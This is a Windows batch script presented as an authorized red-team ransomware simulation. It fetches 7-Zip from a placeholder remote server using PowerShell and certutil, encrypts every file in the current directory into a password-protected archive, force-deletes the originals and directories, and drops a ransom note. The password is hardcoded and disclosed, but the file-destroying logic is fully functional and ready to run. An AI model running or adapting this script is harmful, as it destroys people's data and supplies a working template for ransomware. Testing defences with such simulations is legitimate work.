@echo off
REM ============================================================================
REM File Encryption Simulation Script (Windows Batch)
REM For AUTHORIZED Red Team Operations Only
REM WARNING: This will encrypt and delete files - use only in test environments
REM ============================================================================

setlocal enabledelayedexpansion

REM Configuration
set "REMOTE_SERVER=http://YOUR_SERVER_IP_HERE"
set "SEVEN_ZIP_URL=%REMOTE_SERVER%/7z.exe"
set "SEVEN_ZIP_INSTALLER=%REMOTE_SERVER%/7z-installer.exe"
set "ARCHIVE_NAME=encrypted_files.7z"
set "PASSWORD=antai"
set "INSTALL_DIR=%ProgramFiles%\7-Zip"
set "SEVEN_ZIP_EXE=%INSTALL_DIR%\7z.exe"
set "TEMP_DIR=%TEMP%\7z_temp"

echo ============================================================================
echo File Encryption Simulation - Red Team Operation
echo ============================================================================
echo.
echo [WARNING] This script will encrypt and delete files in current directory
echo [WARNING] For authorized testing only - ensure proper authorization
echo.
echo Current Directory: %CD%
echo Archive Name: %ARCHIVE_NAME%
echo.
timeout /t 5 /nobreak
echo.

REM Step 1: Download 7-Zip standalone executable
echo [*] Step 1/5: Downloading 7-Zip executable...
if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%"

REM Try using PowerShell for download (more reliable)
powershell -Command "(New-Object Net.WebClient).DownloadFile('%SEVEN_ZIP_URL%', '%TEMP_DIR%\7z.exe')" 2>nul

if not exist "%TEMP_DIR%\7z.exe" (
    echo [!] PowerShell download failed, trying certutil...
    certutil -urlcache -split -f "%SEVEN_ZIP_URL%" "%TEMP_DIR%\7z.exe" >nul 2>&1
)

if not exist "%TEMP_DIR%\7z.exe" (
    echo [-] Failed to download 7-Zip executable
    echo [!] Attempting to use system 7-Zip if available...
    set "SEVEN_ZIP_EXE=7z.exe"
) else (
    echo [+] Successfully downloaded 7-Zip executable
    set "SEVEN_ZIP_EXE=%TEMP_DIR%\7z.exe"
)

REM Alternative: Download and install 7-Zip silently
echo [*] Checking if 7-Zip is already installed...
if exist "%ProgramFiles%\7-Zip\7z.exe" (
    echo [+] 7-Zip already installed
    set "SEVEN_ZIP_EXE=%ProgramFiles%\7-Zip\7z.exe"
    goto :encrypt
)

if exist "%ProgramFiles(x86)%\7-Zip\7z.exe" (
    echo [+] 7-Zip already installed (x86)
    set "SEVEN_ZIP_EXE=%ProgramFiles(x86)%\7-Zip\7z.exe"
    goto :encrypt
)

REM Step 2: Silent installation (if installer is available)
echo [*] Step 2/5: Installing 7-Zip silently...
powershell -Command "(New-Object Net.WebClient).DownloadFile('%SEVEN_ZIP_INSTALLER%', '%TEMP_DIR%\7z-installer.exe')" 2>nul

if exist "%TEMP_DIR%\7z-installer.exe" (
    echo [+] Installer downloaded, installing silently...
    REM Silent install with /S parameter (no UAC prompt if run as admin)
    "%TEMP_DIR%\7z-installer.exe" /S /D=%INSTALL_DIR%
    timeout /t 5 /nobreak >nul

    if exist "%INSTALL_DIR%\7z.exe" (
        echo [+] 7-Zip installed successfully
        set "SEVEN_ZIP_EXE=%INSTALL_DIR%\7z.exe"
    )
)

:encrypt
REM Step 3: Create encrypted archive
echo.
echo [*] Step 3/5: Creating encrypted 7z archive...
echo [*] Password: %PASSWORD%
echo [*] This may take a while depending on file size...
echo.

REM Create archive with maximum compression and encryption
"%SEVEN_ZIP_EXE%" a -t7z -m0=lzma2 -mx=9 -mfb=64 -md=32m -ms=on -mhe=on -p%PASSWORD% "%CD%\%ARCHIVE_NAME%" "%CD%\*" -r -x!"%ARCHIVE_NAME%" -xr!*.7z 2>nul

if errorlevel 1 (
    echo [-] Failed to create archive
    echo [!] Check if 7-Zip is properly installed
    pause
    exit /b 1
)

echo [+] Archive created successfully: %ARCHIVE_NAME%

REM Step 4: Verify archive was created
echo.
echo [*] Step 4/5: Verifying archive integrity...
if not exist "%CD%\%ARCHIVE_NAME%" (
    echo [-] Archive file not found!
    echo [-] Aborting deletion phase for safety
    pause
    exit /b 1
)

"%SEVEN_ZIP_EXE%" t -p%PASSWORD% "%CD%\%ARCHIVE_NAME%" >nul 2>&1
if errorlevel 1 (
    echo [-] Archive verification failed!
    echo [-] Aborting deletion phase for safety
    pause
    exit /b 1
)

echo [+] Archive verified successfully

REM Step 5: Delete original files
echo.
echo [*] Step 5/5: Deleting original files...
echo [WARNING] This will permanently delete files!
echo [WARNING] Press Ctrl+C to abort in the next 5 seconds...
timeout /t 5 /nobreak
echo.

REM Delete all files except the archive
for /f "delims=" %%F in ('dir /b /a-d /s ^| findstr /v /i "%ARCHIVE_NAME%"') do (
    echo [*] Deleting: %%F
    del /f /q "%%F" 2>nul
)

REM Delete empty directories
for /f "delims=" %%D in ('dir /b /ad /s ^| sort /r') do (
    rd "%%D" 2>nul
)

echo [+] File deletion completed

REM Cleanup temp directory
if exist "%TEMP_DIR%" rd /s /q "%TEMP_DIR%" 2>nul

REM Final summary
echo.
echo ============================================================================
echo Operation Complete
echo ============================================================================
echo [+] Encrypted archive: %CD%\%ARCHIVE_NAME%
echo [+] Password: %PASSWORD%
echo [+] Original files have been deleted
echo.
echo [*] To extract files, use:
echo     7z x %ARCHIVE_NAME% -p%PASSWORD%
echo ============================================================================
echo.

REM Create a ransom note (for simulation purposes)
echo ============================================================================ > README_IMPORTANT.txt
echo YOUR FILES HAVE BEEN ENCRYPTED >> README_IMPORTANT.txt
echo ============================================================================ >> README_IMPORTANT.txt
echo. >> README_IMPORTANT.txt
echo All your files have been encrypted with military-grade encryption. >> README_IMPORTANT.txt
echo. >> README_IMPORTANT.txt
echo [This is a SIMULATED attack for authorized red team testing] >> README_IMPORTANT.txt
echo. >> README_IMPORTANT.txt
echo Archive: %ARCHIVE_NAME% >> README_IMPORTANT.txt
echo Password: %PASSWORD% >> README_IMPORTANT.txt
echo. >> README_IMPORTANT.txt
echo ============================================================================ >> README_IMPORTANT.txt

echo [+] Ransom note created: README_IMPORTANT.txt
echo.

pause
exit /b 0
